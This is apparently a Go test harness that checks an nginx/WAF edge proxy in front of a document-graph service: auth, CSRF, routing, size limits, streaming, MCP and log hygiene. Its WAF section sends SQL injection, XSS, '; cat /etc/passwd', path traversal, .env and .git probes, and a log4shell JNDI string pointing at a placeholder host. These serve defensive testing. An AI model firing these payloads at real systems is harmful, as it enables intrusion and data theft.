// edgecheck holds the JSON, timing and audit assertions for edge-check.sh.
// HTTP requests still use curl: private config/header files, -q first, bounded.
package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

func must(err error) {
	if err != nil {
		panic(err)
	}
}
func read(path string) []byte        { b, err := os.ReadFile(path); must(err); return b }
func write(path string, b []byte)    { must(os.WriteFile(path, b, 0600)) }
func encode(v any) []byte            { b, err := json.Marshal(v); must(err); return b }
func object(b []byte) map[string]any { var v map[string]any; must(json.Unmarshal(b, &v)); return v }

func rpcResult(body []byte) (map[string]any, error) {
	// Streamable HTTP may answer with JSON or an SSE message envelope.
	for _, line := range bytes.Split(body, []byte("\n")) {
		if bytes.HasPrefix(line, []byte("data: ")) {
			body = bytes.TrimPrefix(line, []byte("data: "))
			break
		}
	}
	var envelope map[string]any
	if json.Unmarshal(body, &envelope) != nil || envelope["error"] != nil {
		return nil, fmt.Errorf("MCP RPC failed")
	}
	result, ok := envelope["result"].(map[string]any)
	if !ok || result["isError"] == true {
		return nil, fmt.Errorf("MCP tool failed")
	}
	return result, nil
}
func expect(ok bool, name string) {
	if !ok {
		panic(name)
	}
	fmt.Println("OK:", name)
}

type probe struct {
	dir, base string
	serial    int
}
type response struct {
	code    int
	body    []byte
	headers http.Header
}

func (p *probe) command(method, path, config string, timeout int, extra ...string) (*exec.Cmd, string, string) {
	p.serial++
	body, headers := filepath.Join(p.dir, fmt.Sprintf("body-%d", p.serial)), filepath.Join(p.dir, fmt.Sprintf("headers-%d", p.serial))
	args := []string{"-q", "--silent", "--show-error", "--noproxy", "*", "--path-as-is", "--max-time", strconv.Itoa(timeout), "-X", method, "-D", headers, "-o", body, "-w", "%{http_code}"}
	if strings.HasPrefix(p.base, "https://") {
		args = append(args, "--cacert", filepath.Join(p.dir, "ca.crt"))
	}
	if config != "" {
		args = append(args, "-K", filepath.Join(p.dir, config))
	}
	args = append(args, extra...)
	args = append(args, p.base+path)
	return exec.Command("curl", args...), body, headers
}

func parseHeaders(file string) http.Header {
	f, err := os.Open(file)
	must(err)
	defer f.Close()
	h := http.Header{}
	s := bufio.NewScanner(f)
	for s.Scan() {
		if k, v, ok := strings.Cut(s.Text(), ":"); ok {
			h.Add(k, strings.TrimSpace(v))
		}
	}
	must(s.Err())
	return h
}

func (p *probe) request(method, path, config string, data []byte, extra ...string) response {
	if data != nil {
		file := filepath.Join(p.dir, "request.json")
		write(file, data)
		extra = append(extra, "-H", "Content-Type: application/json", "--data-binary", "@"+file)
	}
	cmd, body, headers := p.command(method, path, config, 120, extra...)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	out, err := cmd.Output()
	if err != nil {
		write(filepath.Join(p.dir, "curl-failure.log"), stderr.Bytes())
		panic(fmt.Sprintf("curl request failed (%v; private diagnostics withheld)", err))
	}
	code, err := strconv.Atoi(string(out))
	must(err)
	return response{code, read(body), parseHeaders(headers)}
}

func (p *probe) check(name, method, path string, data []byte, codes ...int) response {
	r := p.request(method, path, "auth.curl", data)
	ok := false
	for _, c := range codes {
		ok = ok || r.code == c
	}
	expect(ok, fmt.Sprintf("%s (HTTP %d)", name, r.code))
	return r
}

func (p *probe) ingest(name string, data []byte, extra ...string) string {
	r := p.request("POST", "/v1/ingest", "auth.curl", data, extra...)
	expect(r.code == 200 || r.code == 202, name)
	id, _ := object(r.body)["document_id"].(string)
	expect(id != "", name+" document ID")
	return p.waitIngest(name, id)
}

func (p *probe) waitIngest(name, id string) string {
	for i := 0; i < 120; i++ {
		r := p.request("GET", "/v1/documents/"+id+"/status", "auth.curl", nil)
		status, _ := object(r.body)["status"].(string)
		if status == "done" {
			return id
		}
		if status == "failed" {
			panic(name + " ingestion failed")
		}
		time.Sleep(500 * time.Millisecond)
	}
	panic(name + " ingestion timed out")
}

// docs verifies that the public static shell still requires the edge login.
func (p *probe) docs() {
	r := p.request("GET", "/docs/", "", nil)
	expect(r.code == 401 && strings.HasPrefix(r.headers.Get("WWW-Authenticate"), "Basic"), "docs require Basic login")
	r = p.check("authenticated Swagger UI", "GET", "/docs/", nil, 200)
	expect(strings.HasPrefix(r.headers.Get("Content-Type"), "text/html") && bytes.Contains(r.body, []byte(`id="swagger-ui"`)), "Swagger UI shell content")
	expect(strings.Contains(r.headers.Get("Content-Security-Policy"), "default-src 'none'"), "docs CSP survives edge proxy")
	r = p.check("authenticated OpenAPI specification", "GET", "/docs/openapi.yaml", nil, 200)
	expect(bytes.Equal(r.body, read("docs/openapi.yaml")), "edge serves canonical OpenAPI bytes")
}

func (p *probe) routing() {
	root := p.check("root relative redirect", "GET", "/", nil, 302)
	expect(root.headers.Get("Location") == "/ui/", "root preserves the external port with a relative Location")
	redirect := p.check("bare UI redirect", "GET", "/ui", nil, 301)
	expect(redirect.headers.Get("Location") == "/ui/", "bare UI preserves the external port with a relative Location")
	r := p.check("UI shell", "GET", "/ui/", nil, 200)
	expect(bytes.Contains(r.body, []byte(`id="graph"`)), "embedded UI shell content")
	for _, asset := range []string{"app.js", "app.css"} {
		p.check("UI asset "+asset, "GET", "/ui/"+asset, nil, 200)
	}
	marker := string(read(filepath.Join(p.dir, "marker")))
	var ids []string
	files, err := filepath.Glob("deploy/edge/testdata/*.md")
	must(err)
	expect(len(files) >= 13, "synthetic polyglot corpus has at least 13 documents")
	for _, path := range files {
		file := filepath.Base(path)
		text := string(read(filepath.Join("deploy/edge/testdata", file))) + "\n" + marker
		ids = append(ids, p.ingest("JSON corpus "+file, encode(map[string]any{"text": text, "source": "edge-json-" + file})))
		copy := filepath.Join(p.dir, "Città progetto ("+file+")")
		write(copy, []byte(text))
		ids = append(ids, p.ingest("multipart corpus "+file, nil, "-F", "file=@"+copy))
	}
	r = p.check("marker search", "POST", "/v1/search", encode(map[string]any{"query": marker, "kind": "chunk"}), 200)
	hits, _ := object(r.body)["hits"].([]any)
	expect(len(hits) > 0, "ingested marker is searchable")
	p.check("SQL-looking search", "POST", "/v1/search", encode(map[string]any{"query": "SELECT * FROM users WHERE id = 1 OR 1=1; UNION SELECT password FROM users;"}), 200)
	p.check("documents list", "GET", "/v1/documents", nil, 200)
	p.check("encoded slash in query remains allowed", "GET", "/v1/documents?x=a%2Fb", nil, 200)
	for _, suffix := range []string{"", "/status", "/content"} {
		p.check("document read "+suffix, "GET", "/v1/documents/"+ids[0]+suffix, nil, 200)
	}
	r = p.check("entity search", "POST", "/v1/search", encode(map[string]any{"query": marker, "kind": "entity"}), 200)
	hits, _ = object(r.body)["hits"].([]any)
	expect(len(hits) > 0, "mock extraction provides entity")
	id := hits[0].(map[string]any)["id"].(string)
	p.check("entity read", "GET", "/v1/entities/"+url.PathEscape(id), nil, 200)
	p.check("traverse", "POST", "/v1/traverse", encode(map[string]any{"entity": id, "depth": 1}), 200)
	r = p.check("agent enabled", "GET", "/v1/agent/status", nil, 200)
	expect(object(r.body)["enabled"] == true && object(r.body)["stream"] == true, "offline agent and streaming enabled")
	r = p.check("SQL-looking ask", "POST", "/v1/agent/ask", encode(map[string]any{"question": string(read("deploy/edge/testdata/javascript.md")) + string(read("deploy/edge/testdata/bash.md"))}), 200)
	expect(strings.Contains(string(r.body), "Offline edge check completed."), "deterministic stub answer")
	// Versions share a source but have different hashes.
	a := p.ingest("version one", encode(map[string]any{"text": "Ada works for EdgeLabs. " + marker, "source": "edge-versions"}))
	b := p.ingest("version two", encode(map[string]any{"text": "Ada works for EdgeLabs. Revised. " + marker, "source": "edge-versions"}))
	r = p.check("per-version DELETE", "DELETE", "/v1/documents/"+a, nil, 200)
	expect(object(r.body)["deleted"] == float64(1), "per-version deletes exactly one")
	p.check("remaining version", "GET", "/v1/documents/"+b+"/status", nil, 200)
	c := p.ingest("version three", encode(map[string]any{"text": "Ada works for EdgeLabs. Third revision. " + marker, "source": "edge-versions"}))
	r = p.check("chain DELETE", "DELETE", "/v1/documents/"+c+"?chain=1", nil, 200)
	expect(object(r.body)["deleted"] == float64(2), "chain deletes remaining two versions")
	p.check("deleted version absent", "GET", "/v1/documents/"+b+"/status", nil, 404)
	for _, id := range ids {
		p.check("corpus DELETE", "DELETE", "/v1/documents/"+id, nil, 200)
	}
}

func closedRouteResponse(mode string, r response) bool {
	// CRS may reject a closed method or raw traversal before nginx routing.
	return (r.code == 404 || r.code == 405 || mode == "On" && r.code == 403) && !strings.Contains(r.headers.Get("Content-Type"), "application/json")
}

func (p *probe) auth(mode string) {
	for _, config := range []string{"", "wrong.curl", "bearer.curl"} {
		r := p.request("GET", "/v1/documents", config, nil)
		expect(r.code == 401 && strings.HasPrefix(r.headers.Get("WWW-Authenticate"), "Basic"), "Basic challenge "+config)
	}
	expect(p.request("GET", "/healthz", "", nil).code == 200, "health without credentials")
	for _, method := range []string{"POST", "DELETE"} {
		path := "/v1/search"
		if method == "DELETE" {
			path = "/mcp"
		}
		for _, headers := range [][]string{
			{"Sec-Fetch-Site: cross-site"}, {"Sec-Fetch-Site: same-site"}, {"Origin: https://evil.example"}, {"Origin: null"},
		} {
			extra := []string{}
			for _, h := range headers {
				extra = append(extra, "-H", h)
			}
			r := p.request(method, path, "auth.curl", encode(map[string]any{"query": "Ada"}), extra...)
			expect(r.code == 403, "CSRF "+method+" "+headers[0])
		}
		for _, headers := range [][]string{nil, {"Sec-Fetch-Site: same-origin", "Origin: " + p.base}} {
			extra := []string{}
			for _, h := range headers {
				extra = append(extra, "-H", h)
			}
			r := p.request(method, path, "auth.curl", encode(map[string]any{"query": "Ada"}), extra...)
			expect((method == "POST" && r.code == 200) || (method == "DELETE" && r.code == 400), "CSRF permitted "+method)
		}
	}
	r := p.request("POST", "/v1/ingest", "auth.curl", nil, "-H", "Sec-Fetch-Site: cross-site", "-F", "file=@deploy/edge/testdata/design.md")
	expect(r.code == 403, "cross-site multipart refused")
	for _, pair := range [][2]string{{"GET", "/metrics"}, {"GET", "/readyz"}, {"POST", "/v1/cypher"}, {"PUT", "/v1/ingest"}, {"OPTIONS", "/v1/search"}, {"GET", "/v1/unknown"}, {"GET", "/ui/../metrics"}} {
		r = p.request(pair[0], pair[1], "auth.curl", nil)
		expect(closedRouteResponse(mode, r), "allowlist "+pair[0]+" "+pair[1])
	}
}

var encodedPathProbes = [][2]string{
	{"GET", "/v1%2Fdocuments"},
	{"GET", "/v1/documents/%2e%2e/metrics"},
	{"GET", "/ui/%2E%2E/metrics"},
	{"DELETE", "/v1/documents/x%5Cy"},
	{"GET", "/v1%2fagent%2fstatus"},
}

func (p *probe) encodedPaths(mode string) {
	for _, pair := range encodedPathProbes {
		r := p.request(pair[0], pair[1], "auth.curl", nil)
		expect((r.code == 400 || mode == "On" && r.code == 403) && !strings.Contains(r.headers.Get("Content-Type"), "application/json"), fmt.Sprintf("encoded path %s %s (HTTP %d)", pair[0], pair[1], r.code))
	}
	p.check("encoded-path upstream log positive control", "GET", "/v1/documents", nil, 200)
}

func encodedPathsUpstreamProof(before, after []byte) error {
	// gkg logs URL.Path, which is decoded even when Go routes escaped segments.
	// Count both spellings, including the alias of the positive-control path.
	counts := func(data []byte) map[string]int {
		result := map[string]int{}
		for _, line := range bytes.Split(data, []byte("\n")) {
			var record struct{ Msg, Method, Path string }
			if json.Unmarshal(line, &record) == nil && record.Msg == "http" {
				result[record.Method+" "+record.Path]++
			}
		}
		return result
	}
	a, b := counts(before), counts(after)
	control := "GET /v1/documents"
	if b[control]-a[control] != 1 {
		return fmt.Errorf("missing unique positive control or encoded document-list alias reached upstream")
	}
	for _, pair := range encodedPathProbes {
		decoded, err := url.PathUnescape(pair[1])
		if err != nil {
			return err
		}
		for _, path := range []string{pair[1], decoded} {
			key := pair[0] + " " + path
			if key != control && b[key] != a[key] {
				return fmt.Errorf("encoded path reached upstream or request logs were truncated")
			}
		}
	}
	return nil
}

func sizedJSON(size int) []byte {
	body := encode(map[string]any{"text": "Ada works for EdgeLabs.", "source": fmt.Sprintf("edge-json-boundary-%d", size)})
	// Padding inside the text field exercises the JSON parser and CRS targets.
	return bytes.Replace(body, []byte("Ada works for EdgeLabs."), append([]byte("Ada works for EdgeLabs."), bytes.Repeat([]byte(" "), size-len(body))...), 1)
}

func (p *probe) rejectJSON() {
	r := p.request("POST", "/v1/ingest", "auth.curl", sizedJSON(4259840+1))
	expect(r.code == 413 && !bytes.Contains(r.body, []byte("body_too_large")), fmt.Sprintf("JSON over non-file cap rejected by edge (HTTP %d)", r.code))
	r = p.request("POST", "/v1/ingest", "auth.curl", []byte(`{"text":`))
	expect(r.code == 400 && !strings.Contains(r.headers.Get("Content-Type"), "application/json"), "malformed JSON retains edge 400")
	p.check("non-file upstream log positive control", "GET", "/v1/documents", nil, 200)
}

func noFilesUpstreamProof(before, after []byte) error {
	counts := func(data []byte) map[string]int {
		result := map[string]int{}
		for _, line := range bytes.Split(data, []byte("\n")) {
			var record struct{ Msg, Method, Path string }
			if json.Unmarshal(line, &record) == nil && record.Msg == "http" {
				result[record.Method+" "+record.Path]++
			}
		}
		return result
	}
	a, b := counts(before), counts(after)
	if b["GET /v1/documents"] <= a["GET /v1/documents"] {
		return fmt.Errorf("missing fresh upstream request log positive control")
	}
	if b["POST /v1/ingest"] != a["POST /v1/ingest"] {
		return fmt.Errorf("oversized non-file request reached upstream or logs were truncated")
	}
	return nil
}

func (p *probe) limits() {
	id := p.ingest("JSON just under 4 MiB", sizedJSON((4<<20)-1024))
	p.check("near-cap JSON done and deleted", "DELETE", "/v1/documents/"+id, nil, 200)
	const cap = 20 << 20
	for _, size := range []int{cap - 1024, cap + 1024, 21037056 + 1} {
		// File bytes are not parsed into ARGS. Whitespace avoids thousands of
		// chunks while retaining a small meaningful document to finish ingest.
		file := filepath.Join(p.dir, "boundary.txt")
		prefix := []byte("Ada works for EdgeLabs.\n")
		write(file, append(prefix, bytes.Repeat([]byte(" "), size-len(prefix))...))
		extra := []string{"-F", "file=@" + file, "-F", fmt.Sprintf("source=edge-boundary-%d", size)}
		if size < cap {
			id = p.ingest("multipart just under gkg cap", nil, extra...)
			p.check("near-cap multipart done and deleted", "DELETE", "/v1/documents/"+id, nil, 200)
			continue
		}
		r := p.request("POST", "/v1/ingest", "auth.curl", nil, extra...)
		if size < 21037056 {
			expect(r.code == 413 && bytes.Contains(r.body, []byte("body_too_large")), "multipart gkg 413")
		} else {
			expect(r.code == 413 && !bytes.Contains(r.body, []byte("body_too_large")), "multipart nginx 413")
		}
	}
}

func (p *probe) stream() { p.streamDuring(nil) }

func (p *probe) streamDuring(reload func()) {
	file := filepath.Join(p.dir, "stream-request.json")
	question := "Explain SELECT * FROM users WHERE id = 1 OR 1=1;"
	if reload != nil {
		question = "edge-check held renewal " + question
	}
	write(file, encode(map[string]any{"question": question}))
	cmd, _, headers := p.command("POST", "/v1/agent/ask/stream", "auth.curl", 30, "-N", "-H", "Content-Type: application/json", "--data-binary", "@"+file)
	// Replace the output file with stdout so arrivals are measured as read.
	for i := range cmd.Args {
		if cmd.Args[i] == "-o" {
			cmd.Args[i+1] = "-"
		}
	}
	stdout, err := cmd.StdoutPipe()
	must(err)
	cmd.Stderr = io.Discard
	must(cmd.Start())
	defer func() {
		if cmd.ProcessState == nil {
			cmd.Process.Kill()
			cmd.Wait()
		}
	}()
	var first, done time.Time
	deltas := 0
	scan := bufio.NewScanner(stdout)
	for scan.Scan() {
		switch scan.Text() {
		case "event: delta":
			if first.IsZero() {
				first = time.Now()
				if reload != nil {
					reload()
					expect(time.Since(first) < 12*time.Second, "reload and concurrent requests completed while ask stream was held")
				}
			}
			deltas++
		case "event: done":
			done = time.Now()
		case "event: error":
			panic("ask stream error")
		}
	}
	must(scan.Err())
	must(cmd.Wait())
	expect(deltas >= 3 && !first.IsZero() && done.Sub(first) >= 500*time.Millisecond, "TLS Basic stream first frame before completion")
	expect(parseHeaders(headers).Get("X-Accel-Buffering") == "no", "stream buffering disabled")
	if reload != nil {
		expect(done.Sub(first) >= 12*time.Second, "held ask stream completed across renewal reload")
	}
}

func (p *probe) mcp(long bool) { p.mcpDuring(long, nil) }

func (p *probe) mcpDuring(long bool, reload func()) {
	init := encode(map[string]any{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": map[string]any{"protocolVersion": "2025-03-26", "capabilities": map[string]any{}, "clientInfo": map[string]any{"name": "edge-check", "version": "1"}}})
	// Legal JSON whitespace exercises the transport cap without inventing a
	// multi-megabyte client name or changing the MCP initialize schema.
	init = append(init[:len(init)-1], append(bytes.Repeat([]byte(" "), (4<<20)-1024-len(init)), '}')...)
	r := p.request("POST", "/mcp", "auth.curl", init, "-H", "Accept: application/json, text/event-stream")
	expect(r.code == 200, "MCP initialize just under 4 MiB")
	session := r.headers.Get("Mcp-Session-Id")
	expect(session != "", "MCP session ID")
	h := []string{"-H", "Accept: application/json, text/event-stream", "-H", "Mcp-Session-Id: " + session, "-H", "MCP-Protocol-Version: 2025-03-26"}
	r = p.request("POST", "/mcp", "auth.curl", encode(map[string]any{"jsonrpc": "2.0", "method": "notifications/initialized"}), h...)
	expect(r.code == 202, "MCP initialized notification")
	for i, call := range []map[string]any{
		{"method": "tools/list"},
		{"method": "tools/call", "params": map[string]any{"name": "search", "arguments": map[string]any{"query": "SELECT * FROM users WHERE id = 1 OR 1=1; UNION SELECT password FROM users;", "kind": "chunk"}}},
		{"method": "tools/call", "params": map[string]any{"name": "cypher", "arguments": map[string]any{"query": "MATCH (n:Entity) WHERE n.name = 'Ada' RETURN n LIMIT 5"}}},
	} {
		call["jsonrpc"] = "2.0"
		call["id"] = i + 2
		r = p.request("POST", "/mcp", "auth.curl", encode(call), h...)
		result, err := rpcResult(r.body)
		if err != nil || r.code != 200 {
			write(filepath.Join(p.dir, "mcp-failure.log"), r.body)
		}
		expect(r.code == 200 && err == nil, fmt.Sprintf("MCP call %d", i))
		if i == 0 {
			tools, _ := result["tools"].([]any)
			expect(len(tools) == 7, "MCP lists seven tools")
		}
	}
	if reload == nil && long {
		files, err := filepath.Glob("deploy/edge/testdata/*.md")
		must(err)
		marker := string(read(filepath.Join(p.dir, "marker")))
		for i, file := range files {
			call := map[string]any{"jsonrpc": "2.0", "id": 100 + i, "method": "tools/call", "params": map[string]any{"name": "ingest", "arguments": map[string]any{"text": string(read(file)) + "\n" + marker, "source": "edge-mcp-" + filepath.Base(file)}}}
			r = p.request("POST", "/mcp", "auth.curl", encode(call), h...)
			result, err := rpcResult(r.body)
			expect(r.code == 200 && err == nil, "MCP corpus "+filepath.Base(file))
			content, ok := result["structuredContent"].(map[string]any)
			expect(ok, "MCP ingest structured content")
			id, _ := content["document_id"].(string)
			expect(id != "", "MCP ingest document ID")
			p.waitIngest("MCP corpus "+filepath.Base(file), id)
			p.check("MCP corpus DELETE", "DELETE", "/v1/documents/"+id, nil, 200)
		}
	}
	seconds := 2
	if long {
		seconds = 75
	}
	if reload != nil {
		seconds = 90
	}
	cmd, _, headers := p.command("GET", "/mcp", "auth.curl", seconds, append(h, "-N")...)
	for i, arg := range cmd.Args {
		if arg == "-w" {
			cmd.Args[i+1] = "%{http_code} %{time_starttransfer}"
		}
	}
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = io.Discard
	start := time.Now()
	must(cmd.Start())
	defer func() {
		if cmd.ProcessState == nil {
			cmd.Process.Kill()
			cmd.Wait()
		}
	}()
	if reload != nil {
		deadline := time.Now().Add(5 * time.Second)
		for time.Now().Before(deadline) {
			if b, err := os.ReadFile(headers); err == nil && bytes.Contains(b, []byte("text/event-stream")) {
				break
			}
			time.Sleep(50 * time.Millisecond)
		}
		expect(strings.HasPrefix(parseHeaders(headers).Get("Content-Type"), "text/event-stream"), "MCP headers before reload")
		reload()
	}
	err := cmd.Wait()
	exit, ok := err.(*exec.ExitError)
	metadata := strings.Fields(out.String())
	expect(len(metadata) == 2 && metadata[0] == "200", "MCP GET HTTP status")
	firstByte, timingErr := strconv.ParseFloat(metadata[1], 64)
	expect(timingErr == nil && firstByte >= 0 && firstByte < 5 && strings.HasPrefix(parseHeaders(headers).Get("Content-Type"), "text/event-stream"), "MCP GET headers arrived within 5s")
	expect(ok && exit.ExitCode() == 28 && time.Since(start) >= time.Duration(seconds)*time.Second, "MCP session GET remains open for "+strconv.Itoa(seconds)+"s")
	r = p.request("DELETE", "/mcp", "auth.curl", nil, h...)
	expect(r.code == 200 || r.code == 204, "MCP DELETE session")
}

func (p *probe) attacks(mode string) {
	// Prove that Java rules still inspect query parameters on a route with a
	// raw-body exclusion. Named JSON Java matches are not required: the pinned
	// CRS can report those payloads only against REQUEST_BODY.
	java := "java.lang.Runtime java.lang.ProcessBuilder unmarshaller"
	items := [][2]string{
		{"SQLi", "/ui/?probe=" + url.QueryEscape("1' OR 1=1 --")},
		{"XSS", "/ui/?probe=" + url.QueryEscape("<script>alert(1)</script>")},
		{"command injection", "/ui/?probe=" + url.QueryEscape("; cat /etc/passwd")},
		{"plain traversal", "/ui/../etc/passwd"},
		{"git probe", "/.git/config"}, {"env probe", "/.env"},
	}
	for _, item := range items {
		r := p.request("GET", item[1], "auth.curl", nil)
		if mode == "On" {
			expect(r.code == 403, item[0]+" blocked")
		} else {
			expect(r.code != 403, item[0]+" DetectionOnly not blocked")
		}
	}
	r := p.request("GET", "/ui/%2e%2e/%2e%2e/etc/passwd", "auth.curl", nil)
	expect(r.code == 400, "invalid encoded traversal nginx 400")
	for _, attack := range []struct{ name, header string }{{"log4shell", "X-Edge-Probe: ${jndi:ldap://example.invalid/a}"}, {"scanner UA", "User-Agent: sqlmap/1.0"}} {
		r = p.request("GET", "/ui/", "auth.curl", nil, "-H", attack.header)
		expect((mode == "On" && r.code == 403) || (mode != "On" && r.code != 403), attack.name+" "+mode)
	}
	for _, attack := range []struct {
		name, path string
		body       map[string]any
	}{
		{"ingest source", "/v1/ingest", map[string]any{"text": "synthetic", "source": "<script>alert(1)</script>"}},
		{"ingest url", "/v1/ingest", map[string]any{"url": "<script>alert(1)</script>"}},
		{"ingest labels", "/v1/ingest", map[string]any{"text": "synthetic", "labels": []string{"<script>alert(1)</script>"}}},
		{"MCP tool name", "/mcp", map[string]any{"jsonrpc": "2.0", "id": 98, "method": "tools/call", "params": map[string]any{"name": "<script>alert(1)</script>", "arguments": map[string]any{"text": "synthetic"}}}},
		{"MCP source", "/mcp", map[string]any{"jsonrpc": "2.0", "id": 97, "method": "tools/call", "params": map[string]any{"name": "ingest", "arguments": map[string]any{"source": "<script>alert(1)</script>", "text": "synthetic"}}}},
		{"query parameter on excluded route", "/v1/search?query=" + url.QueryEscape("1' OR 1=1 --"), map[string]any{"query": "synthetic"}},
		{"Java query parameter", "/v1/ingest?edgecheck_java_query=" + url.QueryEscape(java), map[string]any{"text": "synthetic"}},
	} {
		r := p.request("POST", attack.path, "auth.curl", encode(attack.body))
		expect((mode == "On" && r.code == 403) || (mode != "On" && r.code != 403), attack.name+" remains inspected "+mode)
	}
	block := string(read(filepath.Join(p.dir, "attack-marker")))
	r = p.request("POST", "/mcp?edgecheck_attack_marker=1", "auth.curl", encode(map[string]any{"jsonrpc": "2.0", "id": 99, "method": "<script>" + strings.Repeat(block, 2048/len(block)) + "</script>"}))
	expect((mode == "On" && r.code == 403) || (mode != "On" && r.code != 403), "2 KiB inspected-field attack "+mode)
}

func prepare(dir string) {
	login := string(read(filepath.Join(dir, "login")))
	password := string(read(filepath.Join(dir, "password")))
	key := string(read(filepath.Join(dir, "api-key")))
	quote := func(s string) string { return strings.NewReplacer("\\", "\\\\", "\"", "\\\"").Replace(s) }
	write(filepath.Join(dir, "auth.curl"), []byte("user = \""+quote(login+":"+password)+"\"\n"))
	write(filepath.Join(dir, "wrong.curl"), []byte("user = \""+quote(login+":"+password+"wrong")+"\"\n"))
	write(filepath.Join(dir, "bearer.curl"), []byte("header = \"Authorization: Bearer "+key+"\"\n"))
}

func (p *probe) rotation() {
	r := p.request("GET", "/v1/documents", "old.curl", nil)
	expect(r.code == 401, fmt.Sprintf("old password rejected after rotation (HTTP %d)", r.code))
	p.waitForDocuments("new password accepted after rotation", 30*time.Second)
}

// Bound each request as well as the overall wait: a stalled upstream must not
// turn a short recovery check into the ordinary request's 120-second timeout.
func (p *probe) waitForDocuments(name string, budget time.Duration) {
	deadline := time.Now().Add(budget)
	attempts, lastCode := 0, 0
	for {
		remaining := time.Until(deadline)
		if remaining <= 0 {
			panic(fmt.Sprintf("%s within %s (last HTTP %d, %d attempt(s))", name, budget, lastCode, attempts))
		}
		requestBudget := min(time.Second, remaining)
		cmd, _, _ := p.command("GET", "/v1/documents", "auth.curl", 1,
			"--max-time", strconv.FormatFloat(requestBudget.Seconds(), 'f', 3, 64))
		var stderr bytes.Buffer
		cmd.Stderr = &stderr
		attempts++
		out, err := cmd.Output()
		lastCode, _ = strconv.Atoi(string(out))
		if lastCode == 401 {
			panic(fmt.Sprintf("%s (HTTP 401 after %d attempt(s))", name, attempts))
		}
		if err == nil && lastCode == 200 && time.Now().Before(deadline) {
			fmt.Printf("OK: %s (HTTP 200 after %d attempt(s))\n", name, attempts)
			return
		}
		if err != nil {
			write(filepath.Join(p.dir, "curl-failure.log"), stderr.Bytes())
		}
		if remaining = time.Until(deadline); remaining > 0 {
			time.Sleep(min(time.Second, remaining))
		}
	}
}

func hygiene(dir, logs, edgeLogs string) {
	data := read(logs)
	login, password := string(read(filepath.Join(dir, "login"))), string(read(filepath.Join(dir, "password")))
	secrets := []string{password, base64.StdEncoding.EncodeToString([]byte(login + ":" + password)), string(read(filepath.Join(dir, "api-key"))), string(read(filepath.Join(dir, "memgraph-password"))), string(read(filepath.Join(dir, "marker")))}
	if old, err := os.ReadFile(filepath.Join(dir, "old-password")); err == nil {
		secrets = append(secrets, string(old), base64.StdEncoding.EncodeToString(append([]byte(login+":"), old...)))
	} else if !os.IsNotExist(err) {
		must(err)
	}
	for _, secret := range secrets {
		expect(!bytes.Contains(data, []byte(secret)), "service logs omit private credential/corpus marker")
	}
	records, err := parseAudit(string(read(edgeLogs)))
	must(err)
	found := false
	for _, record := range records {
		if strings.Contains(record.Raw, "edgecheck_attack_marker") {
			found = true
			expect(!strings.Contains(strings.ToLower(record.Raw), "authorization"), "attack audit record omits Authorization header")
		}
	}
	expect(found, "deliberate attack has an audit record")
	block := read(filepath.Join(dir, "attack-marker"))
	fmt.Printf("OK: 2 KiB marker bytes in logs = %d (reported, not gated)\n", bytes.Count(data, block)*len(block))
}

func main() {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("FAIL: %v\n", r)
			os.Exit(1)
		}
	}()
	args := os.Args[1:]
	switch args[0] {
	case "prepare":
		prepare(args[1])
	case "audit":
		base, err := parseAudit(string(read(args[1])))
		must(err)
		records, err := parseAudit(string(read(args[2])))
		must(err)
		ids := map[string]bool{}
		for _, r := range base {
			ids[r.ID] = true
		}
		counts := countAudit(records, ids)
		fmt.Println(string(encode(counts)))
		if args[3] == "zero" {
			expect(counts.Matches == 0, "legitimate CRS matches = 0")
		}
		if args[3] == "positive" {
			expect(positiveAudit(records, ids), "WAF positive control attack logged rule matches")
			expect(javaProbeMatched(records, ids, "edgecheck_java_query=", "ARGS:edgecheck_java_query"), "Java rule matched outside excluded body: ARGS:edgecheck_java_query")
		}
	case "hygiene":
		hygiene(args[1], args[2], args[3])
	case "nofiles-upstream":
		must(noFilesUpstreamProof(read(args[1]), read(args[2])))
		expect(true, "oversized JSON absent from upstream logs with fresh positive control")
	case "encoded-upstream":
		must(encodedPathsUpstreamProof(read(args[1]), read(args[2])))
		expect(true, "encoded paths absent from upstream logs with fresh positive control")
	default:
		p := &probe{dir: args[1], base: args[2]}
		switch args[0] {
		case "docs":
			p.docs()
		case "routing":
			p.routing()
		case "rotation":
			p.rotation()
		case "restart-routing":
			p.waitForDocuments("upstream routing after healthy gkg restart", 3*time.Second)
		case "auth":
			p.auth(args[3])
		case "encoded-paths":
			p.encodedPaths(args[3])
		case "reject-json":
			p.rejectJSON()
		case "limits":
			p.limits()
		case "stream":
			p.stream()
		case "mcp":
			p.mcp(args[3] == "long")
		case "reload":
			p.mcpDuring(false, func() {
				p.streamDuring(func() {
					cmd := exec.Command(args[3], args[4:]...)
					var output bytes.Buffer
					cmd.Stdout, cmd.Stderr = &output, &output
					must(cmd.Start())
					finished := make(chan error, 1)
					go func() { finished <- cmd.Wait() }()
					requests := 0
					for {
						select {
						case err := <-finished:
							write(filepath.Join(p.dir, "held-renew.log"), output.Bytes())
							must(err)
							expect(!bytes.Contains(output.Bytes(), []byte("fallback")), "renewal reload works as unprivileged nginx user")
							expect(requests > 0, "new requests succeeded throughout certificate renewal")
							p.check("new request after reload", "GET", "/v1/documents", nil, 200)
							return
						default:
							p.check("new request during renewal/reload", "GET", "/v1/documents", nil, 200)
							requests++
							time.Sleep(100 * time.Millisecond)
						}
					}
				})
			})
		case "waf":
			p.attacks(args[3])
		default:
			panic("unknown section")
		}
	}
}
